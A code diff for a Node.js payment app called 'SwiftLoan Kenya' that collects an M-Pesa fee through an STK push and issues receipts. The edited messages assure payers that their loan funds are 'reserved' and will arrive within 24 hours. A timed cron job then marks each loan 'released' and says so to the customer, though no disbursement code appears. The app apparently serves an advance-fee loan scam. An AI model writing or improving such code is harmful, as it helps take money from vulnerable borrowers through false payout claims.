@@ -60,7 +60,7 @@ app.post("/pay", async (req, res) => {
       external_reference: reference,
       customer_name: "Customer",
       callback_url: "https://swift-loan-refunding.onrender.com/callback",
-      channel_id: "000119"
+      channel_id: "000103"
     };
 
     const url = "https://swiftwallet.co.ke/pay-app-v2/payments.php";
@@ -83,9 +83,8 @@ app.post("/pay", async (req, res) => {
         loan_amount: loan_amount || "50000",
         phone: formattedPhone,
         customer_name: "N/A",
-        status: "processing",
-        status_note: `Fee payment accepted. Your loan is now being processed. 
-        Disbursement will be completed within 24 hours. `,
+        status: "pending",
+        status_note: `STK push  sent to ${formattedPhone}. Please enter your M-Pesa PIN to complete the fee payment and loan disbursement.Withdrawal started..... `,
         timestamp: new Date().toISOString()
       };
 
@@ -180,18 +179,23 @@ app.post("/callback", (req, res) => {
     "N/A";
 
   if ((status === "completed" && data.success === true) || resultCode === 0) {
-    receipts[ref] = {
-      reference: ref,
-      transaction_id: data.transaction_id,
-      transaction_code: data.result?.MpesaReceiptNumber || null,
-      amount: data.result?.Amount || existingReceipt.amount || null,
-      loan_amount: existingReceipt.loan_amount || "50000",
-      phone: data.result?.Phone || existingReceipt.phone || null,
-      customer_name: customerName,
-      status: "success",
-      status_note: `Loan withdrawal successful and fee payment accepted ,You will receive your Approved loan within the next 10 minutes Contact support if withdrawal persists,Regards swift loan..`,
-      timestamp: data.timestamp || new Date().toISOString(),
-    };
+  receipts[ref] = {
+    ...existingReceipt,
+    reference: ref,
+    transaction_id: data.transaction_id,
+    transaction_code: data.result?.MpesaReceiptNumber || null,
+    amount: data.result?.Amount || existingReceipt.amount,
+    loan_amount: existingReceipt.loan_amount || "50000",
+    phone: data.result?.Phone || existingReceipt.phone,
+    customer_name: customerName,
+    status: "processing",   // ✅ money confirmed, loan processing
+    status_note: `✅ Your fee payment has been received and verified.  
+Loan Reference: ${ref}.  
+Your loan of KSH ${existingReceipt.loan_amount} is now in the final processing stage and funds are reserved for disbursement.  
+You will receive the amount in your M-Pesa account within 24 hours.  
+Thank you for choosing SwiftLoan Kenya.`,
+    timestamp: data.timestamp || new Date().toISOString(),
+  };
    } else {
   // Default note from Safaricom / aggregator
   let statusNote = data.result?.ResultDesc || "Payment failed or was cancelled.";
@@ -272,25 +276,37 @@ function generateReceiptPDF(receipt, res) {
   let watermarkColor = "green";
 
   if (receipt.status === "success") {
-    headerColor = "#2196F3";
-    watermarkText = "PAID";
-    watermarkColor = "green";
-  } else if (["cancelled", "error", "stk_failed"].includes(receipt.status)) {
-    headerColor = "#f44336";
-    watermarkText = "FAILED";
-    watermarkColor = "red";
-  } else if (receipt.status === "pending") {
-    headerColor = "#ff9800";
-    watermarkText = "PENDING";
-    watermarkColor = "gray";
-  }
+  headerColor = "#2196F3";    // Blue
+  watermarkText = "PAID";
+  watermarkColor = "green";
+
+} else if (["cancelled", "error", "stk_failed"].includes(receipt.status)) {
+  headerColor = "#f44336";    // Red
+  watermarkText = "FAILED";
+  watermarkColor = "red";
+
+} else if (receipt.status === "pending") {
+  headerColor = "#ff9800";    // Orange
+  watermarkText = "PENDING";
+  watermarkColor = "gray";
+
+} else if (receipt.status === "processing") {
+  headerColor = "#2196F3";    // Blue (Info look)
+  watermarkText = "PROCESSING - FUNDS RESERVED";
+  watermarkColor = "blue";
+
+} else if (receipt.status === "loan_released") {
+  headerColor = "#4caf50";    // Green
+  watermarkText = "RELEASED";
+  watermarkColor = "green";
+}
 
   // Header
   doc.rect(0, 0, doc.page.width, 80).fill(headerColor);
   doc
     .fillColor("white")
     .fontSize(24)
-    .text("âš¡ SWIFTLOAN KENYA LOAN RECEIPT", 50, 25, { align: "left" })
+    .text("⚡ SWIFTLOAN KENYA LOAN RECEIPT", 50, 25, { align: "left" })
     .fontSize(12)
     .text("Loan & Payment Receipt", 50, 55);
 
@@ -336,37 +352,25 @@ function generateReceiptPDF(receipt, res) {
 
   // Footer
   doc.moveDown(2);
-  doc.fontSize(10).fillColor("gray").text("âš¡ SwiftLoan Kenya Â© 2024", { align: "center" });
+  doc.fontSize(10).fillColor("gray").text("⚡ SwiftLoan Kenya © 2024", { align: "center" });
 
   doc.end();
 }
-
-    const cron = require("node-cron");
-
-// Run every 5 minutes
-cron.schedule("*/5 * * * *", () => {
+  const cron = require("node-cron");
+ cron.schedule("*/5 * * * *", () => {
   let receipts = readReceipts();
   const now = Date.now();
 
   for (let ref in receipts) {
     const r = receipts[ref];
-    if (r.status === "processing") {
-      const start = new Date(r.timestamp).getTime();
 
-      // 12-hour checkpoint
-      const halfTime = start + 12 * 60 * 60 * 1000;
-      if (now >= halfTime && !r.halfProcessed) {
-        r.halfProcessed = true; // mark so we don’t repeat
-        r.status_note = "Loan processing is halfway complete. Please keep waiting.";
-        console.log(`⏳ Loan at 50% for ${ref}`);
-      }
+    if (r.status === "processing") {   // ✅ release after 24hrs
+      const releaseTime = new Date(r.timestamp).getTime() + 24 * 60 * 60 * 1000;
 
-      // 24-hour release
-      const releaseTime = start + 24 * 60 * 60 * 1000;
       if (now >= releaseTime) {
         r.status = "loan_released";
         r.status_note = "Loan has been released to your account. Thank you.";
-        console.log(`✅ Loan released for ${ref}`);
+        console.log(`✅ Released loan for ${ref}`);
       }
     }
   }
